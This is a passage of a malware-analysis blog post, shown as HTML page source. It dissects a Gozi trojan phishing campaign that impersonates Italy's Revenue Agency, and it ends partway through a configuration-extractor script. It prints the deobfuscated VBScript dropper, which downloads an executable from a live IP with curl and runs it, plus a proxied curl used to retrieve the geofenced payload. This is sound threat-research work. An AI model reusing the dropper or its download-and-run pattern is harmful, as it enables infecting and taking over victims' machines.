@@ -1,0 +1,978 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Gozi - Italian ShellCode Dance - Toxin Labs</title>
+<meta name="description" content="Breakdown of a recent Gozi trojan Italian targeted campaign ">
+
+
+  <meta name="author" content="0xToxin">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Toxin Labs">
+<meta property="og:title" content="Gozi - Italian ShellCode Dance">
+<meta property="og:url" content="https://0xtoxin.github.io/threat%20breakdown/Gozi-Italy-Campaign/">
+
+
+  <meta property="og:description" content="Breakdown of a recent Gozi trojan Italian targeted campaign ">
+
+
+
+  <meta property="og:image" content="https://0xtoxin.github.io/assets/images/Gozi-Itallian-Shellcode-Dance/logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-03-19T00:00:00+00:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://0xtoxin.github.io/threat%20breakdown/Gozi-Italy-Campaign/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "0xToxin",
+      "url": "https://0xtoxin.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Toxin Labs Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/main/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/main/favicon-16x16.png">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/Logo.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          Toxin Labs
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/#malware-analysis">Malware Analysis</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#threat-breakdown">Threat Breakdown</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#threat-hunting">Threat Hunting</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags">All Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/Gozi-Itallian-Shellcode-Dance/logo.png');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          Gozi - Italian ShellCode Dance
+
+        
+      </h1>
+      
+        <p class="page__lead">Breakdown of a recent Gozi trojan Italian targeted campaign
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  8 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/main/avatar.jpg" alt="0xToxin" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">0xToxin</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Threat Analyst &amp; IR team leader - Malware Analysis - Blue Team</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Israel</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="mailto:igal.lytzki@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/0xToxin" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/0xToxin" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/igal-lytzki-99bb0721a/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Gozi - Italian ShellCode Dance">
+    <meta itemprop="description" content="Breakdown of a recent Gozi trojan Italian targeted campaign">
+    <meta itemprop="datePublished" content="2023-03-19T00:00:00+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-biohazard"></i> On This Blog</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#intro">Intro</a></li>
+  <li><a href="#the-phish">The Phish</a></li>
+  <li><a href="#execution-chain">Execution Chain</a></li>
+  <li><a href="#agenziaentratehta">AgenziaEntrate.hta</a></li>
+  <li><a href="#jscript-encode">Jscript Encode</a></li>
+  <li><a href="#italy-geofence-bypass">Italy Geofence Bypass</a></li>
+  <li><a href="#installazioneexe">Installazione.exe</a>
+    <ul>
+      <li><a href="#sub_40471b">sub_40471B</a></li>
+      <li><a href="#dynamic-analysis">Dynamic Analysis</a></li>
+    </ul>
+  </li>
+  <li><a href="#1st-shellcode">1st ShellCode</a>
+    <ul>
+      <li><a href="#dynamic-api-resolve">Dynamic API Resolve</a></li>
+      <li><a href="#resloveshellcode2_465">resloveShellCode2_465</a></li>
+    </ul>
+  </li>
+  <li><a href="#2nd-shellcode">2nd ShellCode</a></li>
+  <li><a href="#gozi-loader">Gozi Loader</a>
+    <ul>
+      <li><a href="#apc-injection">APC Injection</a></li>
+    </ul>
+  </li>
+  <li><a href="#gozi-binary">Gozi Binary</a></li>
+  <li><a href="#yara-rule">Yara Rule</a></li>
+  <li><a href="#summary">Summary</a></li>
+  <li><a href="#iocs">IOC’s</a></li>
+  <li><a href="#references">References</a></li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="intro">Intro</h1>
+<p>In this blogpost I will be going through a recent campaign targeting the Italian audience which impersonate to “The Agenzia delle Entrate” (Italian Revenue Agency) luring the victims to execute and be part of Gozi botnet.</p>
+
+<h1 id="the-phish">The Phish</h1>
+
+<p>A massive malspam email campaign was spreading around the globe targeting italian individuals impersonating to <a href="https://www.agenziaentrate.gov.it/portale/"><strong>Agenzia delle Entrate</strong></a> letting the users know that there is some problem with VAT and payment related documents:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/1.png" alt="image.png" /></p>
+
+<p>Translation:</p>
+<blockquote>
+  <p>Dear Customer,from the examination of the data and payments relating to the Communication of periodic VAT eliminations, which you presented for the quarter 2023, some inconsistencies emerged.The notifications relating to the inconsistencies found are accessible in the “Tax box” (the Agency section)accessible from the Revenue Agency website (www.agenziaentrate.gov.it) and in the complete version in the archive attached to the current e-mail.This e-mail was created automatically, therefore we recommend that you do not reply to this e-mail address.Verification office,National Directorate of the Revenue Agency</p>
+</blockquote>
+
+<p>The mail contains an attachment: <code class="language-plaintext highlighter-rouge">AgenziaEntrate.hta</code> which is part of the Social Engineering technique the threat actor tries to apply by letting the user know in the mail that he isn’t suppose to reply back to the mail (as it’s an automatically created mail) and the only choice left for the user is to download and open the attachment.</p>
+
+<h1 id="execution-chain">Execution Chain</h1>
+<p>Below you can see a diagram of the execution chain from the moment the phishing mail was opened:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/2.png" alt="image-2.png" /></p>
+
+<h1 id="agenziaentratehta">AgenziaEntrate.hta</h1>
+<p>As I’ve mentioned the email has an <code class="language-plaintext highlighter-rouge">.hta</code> attachment. the hta file contains inside of itself a few empty lines at the beginning and afterward a quite good amount of nonsense data:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/3.png" alt="image-2.png" /></p>
+
+<p>So the first thing I’ve noticed is obfuscated code inside of <code class="language-plaintext highlighter-rouge">script</code> tags:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/4.png" alt="image-3.png" /></p>
+
+<p>After cleaning the script abit we can see clearly what happens here:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/5.png" alt="image-4.png" /></p>
+
+<p>The script simply takes escaped string and unescaping it.</p>
+
+<p>Below is a quick script that does the job, after unescaping the string a URL decode operation was required also to see clearly the output:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib.parse</span>
+
+<span class="n">escapedStr</span> <span class="o">=</span> <span class="s">"do</span><span class="se">\143</span><span class="s">u</span><span class="se">\155</span><span class="s">%65</span><span class="se">\156</span><span class="s">t%2E</span><span class="se">\167</span><span class="s">%72%69%74e%28%27%3C%27%2B%27%73%63</span><span class="se">\162</span><span class="s">i</span><span class="se">\160</span><span class="s">%74%20l</span><span class="se">\141</span><span class="s">%6E</span><span class="se">\147</span><span class="s">%75ag%65%3Dj</span><span class="se">\163\143</span><span class="s">%72i</span><span class="se">\160</span><span class="s">%74%2Een</span><span class="se">\143</span><span class="s">%6Fd%65%3E%27%29"</span>
+<span class="n">unicodeDecodedStr</span> <span class="o">=</span> <span class="n">escapedStr</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'unicode_escape'</span><span class="p">)</span>
+<span class="n">urlDecodedStr</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">unquote</span><span class="p">(</span><span class="n">unicodeDecodedStr</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">urlDecodedStr</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>document.write('&lt;'+'script language=jscript.encode&gt;')
+</code></pre></div></div>
+
+<h1 id="jscript-encode">Jscript Encode</h1>
+<p>As we can see from the output, the content is encoded using <a href="https://en.wikipedia.org/wiki/JScript.Encode#:~:text=Encode%20is%20a%20method%20created,the%20source%20code%20from%20copying.">jscript.encode</a> and it can be decoded using this <a href="https://gist.github.com/bcse/1834878#file-scrdec18-vc8-exe">tool</a>.<br />After decoding the encoded data, the script will unescape a huge blob of data:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/6.png" alt="image.png" /></p>
+
+<p>Using online tool such as <a href="https://gchq.github.io/CyberChef/">CyberChef</a> I’ve URL decoded the blob of data and at the first part of the data looked like obfuscated JS code, but when I’ve scrolled down I found out another script written in VBS:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/7.png" alt="image-2.png" /></p>
+
+<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Window</span><span class="p">.</span><span class="n">ReSizeTo</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span>
+<span class="n">Window</span><span class="p">.</span><span class="n">MoveTo</span> <span class="o">-</span><span class="mi">4000</span><span class="p">,</span> <span class="o">-</span><span class="mi">4000</span>
+<span class="n">set</span> <span class="n">runn</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">)</span>
+<span class="n">dim</span> <span class="n">file</span>
+<span class="n">file</span> <span class="o">=</span> <span class="s">"%systemroot%\\System32\\LogFiles\\"</span> <span class="o">&amp;</span> <span class="s">"\login.exe"</span>
+<span class="n">const</span> <span class="n">DontWaitUntilFinished</span> <span class="o">=</span> <span class="n">false</span><span class="p">,</span> <span class="n">ShowWindow</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="n">DontShowWindow</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">WaitUntilFinished</span> <span class="o">=</span> <span class="n">true</span>
+<span class="n">set</span> <span class="n">oShell</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">)</span>
+<span class="n">oShell</span><span class="p">.</span><span class="n">Run</span> <span class="s">"cmd /c curl http://191.101.2.39/installazione.exe -o %systemroot%\\System32\\LogFiles\\login.exe "</span><span class="p">,</span> <span class="n">DontShowWindow</span><span class="p">,</span> <span class="n">WaitUntilFinished</span>
+<span class="n">runn</span><span class="p">.</span><span class="n">Run</span> <span class="n">file</span> <span class="p">,</span><span class="mi">0</span>
+<span class="n">Close</span>
+</code></pre></div></div>
+
+<p>Clearly the script tries to download external payload and drop it to the user’s disk at <code class="language-plaintext highlighter-rouge">C:\Windows\System32\LogFiles\login.exe</code></p>
+
+<h1 id="italy-geofence-bypass">Italy Geofence Bypass</h1>
+
+<p>The payload that the script tries to retirve utilize the <code class="language-plaintext highlighter-rouge">Curl</code> command.<br />
+I’ve tried to download the file and got the error: <code class="language-plaintext highlighter-rouge">curl: (52) Empty reply from server</code></p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/8.png" alt="image.png" /></p>
+
+<p>So after digging throught the flags of Curl, I found the <a href="https://curl.se/docs/manpage.html#-x">-x flag</a> which allow access the URL through a proxy.<br />So I looked for HTTP proxies in Italy (<a href="http://free-proxy.cz/en/proxylist/country/IT/http/ping/all">free-proxy.cz</a>) And by executed the below command I’ve managed to retrieve the payload:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -x 185.22.57.134:8080 http://191.101.2.39/installazione.exe -o C:\Users\igal\Desktop\AgenziaEntrate1.bin
+</code></pre></div></div>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/9.png" alt="image-2.png" /></p>
+
+<h1 id="installazioneexe">Installazione.exe</h1>
+<p>In this part I will be covering the intial loader and going through some of it functionalities. I’ve opened the loader in IDA and the first thing that caught my attention was the huge <code class="language-plaintext highlighter-rouge">.data</code> section:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/10.png" alt="image.png" /></p>
+
+<p>It’s a good indication that we’re seeing a packed binary.<br />
+Now going through <code class="language-plaintext highlighter-rouge">WinMain</code> there is a single call to a function before the termination of the program:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/11.png" alt="image-2.png" /></p>
+
+<h2 id="sub_40471b">sub_40471B</h2>
+<p>This function will be the actul main function of the loader, it will call the function <code class="language-plaintext highlighter-rouge">mwDecryptWrapper_4041AE</code> which will be the wrapper function for the decryption routine and those will be the function arguments:</p>
+<ol>
+  <li>ShellCode allocated memory</li>
+  <li>Blob1 Length</li>
+  <li>Blob3 Data</li>
+</ol>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/12.png" alt="image-3.png" />
+<img src="/assets/images/Gozi-Itallian-Shellcode-Dance/13.png" alt="image-4.png" /></p>
+
+<p>The wrapper function will then call <code class="language-plaintext highlighter-rouge">mwDecrypt_4040D8</code> and eventually the last function that will be called before <code class="language-plaintext highlighter-rouge">sub_40471B</code> ends will be <code class="language-plaintext highlighter-rouge">mwExecGoziShell_4042A6</code>:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/14.png" alt="image-5.png" />
+<img src="/assets/images/Gozi-Itallian-Shellcode-Dance/15.png" alt="image-6.png" /></p>
+
+<p>The function will jump into the allocated memory that it’s data was previously decrypted.</p>
+<h2 id="dynamic-analysis">Dynamic Analysis</h2>
+<p>Lets see this in the dynamic view:<br />
+<strong>Decryption Phase:</strong></p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/16.png" alt="image-7.png" /></p>
+
+<p><strong>Jump To ShellCode:</strong></p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/17.png" alt="image-8.png" /></p>
+
+<h1 id="1st-shellcode">1st ShellCode</h1>
+
+<p>Now that we’ve entered the 1st ShellCode, We can simply dump it and open it in IDA to futher static analyze it before we dynamically finding our next interesting POI.<br /></p>
+
+<h2 id="dynamic-api-resolve">Dynamic API Resolve</h2>
+<p>The first thing the ShellCode will do is resolving API’s it will need to further execute some function, it will be done by using a technique called <a href="https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode"><strong>PEB Walk</strong></a> and will combine inside of it hashes that simple google can help us to retrieve the hashes values, those are the API’s that will be resolved:</p>
+<ul>
+  <li>LoadLibraryA</li>
+  <li>GetProcAddress</li>
+  <li>GlobalAlloc</li>
+  <li>GetLastError</li>
+  <li>Sleep</li>
+  <li>VirtualAlloc</li>
+  <li>CreateToolhelp32Snapshot</li>
+  <li>Module32First</li>
+  <li>CloseHandle</li>
+</ul>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/18.png" alt="image.png" /></p>
+
+<h2 id="resloveshellcode2_465">resloveShellCode2_465</h2>
+<p>Then In order to jump to the next stage ShellCode a new memory will be allocated using <code class="language-plaintext highlighter-rouge">VirtualAlloc</code> that was previously resolved and then the next shell will be written in the freshly allocated memory (after decrypting it[<code class="language-plaintext highlighter-rouge">decryptShellCode2_4F2</code>]), and after that the function will jump to the ShellCode:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/19.png" alt="image-2.png" /></p>
+
+<h1 id="2nd-shellcode">2nd ShellCode</h1>
+<p>Same as the first ShellCode, the second ShellCode will start by resolving API deynamically, those are the API’s it will resolve:</p>
+<ul>
+  <li>VirtualAlloc</li>
+  <li>VirtualProtect</li>
+  <li>VirtualFree</li>
+  <li>GetVersionExA</li>
+  <li>TerminateProcess</li>
+  <li>ExitProcess</li>
+  <li>SetErrorMode</li>
+</ul>
+
+<p>After the API’s were resolved the ShellCode will use VirtualAlloc to create a new memory section (<code class="language-plaintext highlighter-rouge">0x230000</code>):</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/20.png" alt="image.png" /></p>
+
+<p>Then a decryption loop will occur which will resolve and overwrite the freshly allocated memory with an executable binary:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/21.png" alt="image-2.png" /></p>
+
+<p>At this point I’ve dumped the binary and moved to analyze it.</p>
+
+<h1 id="gozi-loader">Gozi Loader</h1>
+<p>I’ve tried to upload the binary to <a href="https://tria.ge/dashboard">Tria.ge</a> and instantly got a result that they found it’s Gozi binary statically:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/22.png" alt="image.png" /></p>
+
+<p>Which made me a bit confused because I know that Gozi stores references to it’s config below the section table (and there supposed to be 3 config entries)</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/23.png" alt="image-2.png" /></p>
+
+<p>So I’ve opened IDA and tried to look what’s going on with this binary, it contains a small amount of function (about 30) and in the “main” function, it will simply hold a reference to another function and will use the API <code class="language-plaintext highlighter-rouge">ExitProcess</code> in order to execute this function:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/24.png" alt="image-4.png" /></p>
+
+<h2 id="apc-injection">APC Injection</h2>
+<p>I was hovering over the function <code class="language-plaintext highlighter-rouge">mwMainFunc_4019F1</code> and suddently saw a call to the API <code class="language-plaintext highlighter-rouge">QueueUserAPC</code></p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/25.png" alt="image-5.png" /></p>
+
+<p>The main thing we need to know about APC Injection is that the first argument passed to <code class="language-plaintext highlighter-rouge">QueueUserAPC</code> will be the malicious content that the executed thread will execute. (In this case the developers of Gozi used the API <code class="language-plaintext highlighter-rouge">SleepEx</code> in order to perform the injection) <br />In this case the first passed argument is actually a function <code class="language-plaintext highlighter-rouge">pfnAPC_40139F</code> which will decrypt the final Gozi payload and execute it using <code class="language-plaintext highlighter-rouge">ExitThread</code></p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/26.png" alt="image-6.png" /></p>
+
+<p>Lets see this in the debugger:
+<strong>APC Injection:</strong></p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/27.png" alt="image-7.png" /></p>
+
+<p><strong>Final Payload Decryption Routine:</strong></p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/28.png" alt="image-8.png" /></p>
+
+<p>Now I can dump the final payload and see whether or not I can extract some configs out of it.</p>
+
+<h1 id="gozi-binary">Gozi Binary</h1>
+<p>I took a look below the section table and now we have 3 config entries as I would’ve expected:</p>
+
+<p><img src="/assets/images/Gozi-Itallian-Shellcode-Dance/29.png" alt="image.png" /></p>
+
+<p>I won’t be going over Gozi’s capability but what was interesting for me is extracting the configurations for it, so I’ve read about how Gozi handles the configuration and how to work around it using <a href="https://www.sentinelone.com/labs/writing-malware-configuration-extractors-for-isfb-ursnif/">SentinelOne blog</a> about gozi and this was my final script:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pefile</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="nn">malduck</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+
+<span class="n">FILE_PATH</span> <span class="o">=</span> <span class="s">'/Users/igal/malwares/gozi/01-03-23/8. final.bin'</span>
+
+<span class="n">FILE_DATA</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">FILE_PATH</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">locate_structs</span><span class="p">():</span>
+    <span class="n">struct_list</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="n">pe</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="n">PE</span><span class="p">(</span><span class="n">FILE_PATH</span><span class="p">)</span>
+
+    <span class="n">nt_head</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">DOS_HEADER</span><span class="p">.</span><span class="n">e_lfanew</span>
+    <span class="n">file_head</span> <span class="o">=</span> <span class="n">nt_head</span> <span class="o">+</span> <span class="mi">4</span>
+    <span class="n">opt_head</span> <span class="o">=</span> <span class="n">file_head</span> <span class="o">+</span><span class="mi">18</span>
+    <span class="n">size_of_opt_head</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">FILE_HEADER</span><span class="p">.</span><span class="n">SizeOfOptionalHeader</span>
+    <span class="n">text_section_table</span> <span class="o">=</span> <span class="n">opt_head</span> <span class="o">+</span> <span class="n">size_of_opt_head</span> <span class="o">+</span> <span class="mi">2</span>
+    <span class="n">num_sections</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">FILE_HEADER</span><span class="p">.</span><span class="n">NumberOfSections</span>
+    <span class="n">size_of_section_table</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">*</span> <span class="p">(</span><span class="n">num_sections</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">end_of_section_table</span> <span class="o">=</span> <span class="n">text_section_table</span> <span class="o">+</span> <span class="n">size_of_section_table</span>
+    <span class="n">jj_struct_start</span> <span class="o">=</span> <span class="n">end_of_section_table</span> <span class="o">+</span> <span class="mi">48</span>
+    <span class="n">structs</span> <span class="o">=</span> <span class="n">FILE_DATA</span><span class="p">[</span><span class="n">jj_struct_start</span><span class="p">:</span><span class="n">jj_struct_start</span> <span class="o">+</span> <span class="mi">60</span><span class="p">]</span>    
+    <span class="k">return</span> <span class="n">structs</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'JJ'</span><span class="p">)[</span><span class="mi">1</span><span class="p">:]</span>
+
+<span class="k">def</span> <span class="nf">convertEndian</span><span class="p">(</span><span class="n">byteData</span><span class="p">):</span>
+    <span class="n">big_endian_uint</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&gt;I'</span><span class="p">,</span> <span class="n">byteData</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">little_endian_uint</span> <span class="o">=</span> <span class="n">big_endian_uint</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">byteorder</span><span class="o">=</span><span class="s">'little'</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">little_endian_uint</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">blobDataRetrieve</span><span class="p">(</span><span class="n">blobOff</span><span class="p">,</span> <span class="n">blobLen</span><span class="p">):</span>
+    <span class="n">pe</span> <span class="o">=</span> <span class="n">pefile</span><span class="p">.</span><span class="n">PE</span><span class="p">(</span><span class="n">FILE_PATH</span><span class="p">)</span>
+    <span class="n">configOff</span> <span class="o">=</span> <span class="n">pe</span><span class="p">.</span><span class="n">get_offset_from_rva</span><span class="p">(</span><span class="n">blobOff</span><span class="p">)</span>
+    <span class="n">blobData</span> <span class="o">=</span> <span class="n">FILE_DATA</span><span class="p">[</span><span class="n">configOff</span><span class="p">:</span><span class="n">configOff</span> <span class="o">+</span> <span class="n">blobLen</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x00\x00\x00\x00\x00</span><span class="s">'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">blobData</span>
+    
+<span class="k">def</span> <span class="nf">aplibDecryption</span><span class="p">(</span><span class="n">config_data</span><span class="p">):</span>
+    <span class="n">ptxt_data</span> <span class="o">=</span> <span class="n">malduck</span><span class="p">.</span><span class="n">aplib</span><span class="p">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">config_data</span><span class="p">)</span>
+    <span class="c1">#print(ptxt_data)
+</span>    <span class="n">entry_data</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">entry</span> <span class="ow">in</span> <span class="n">ptxt_data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">):</span>
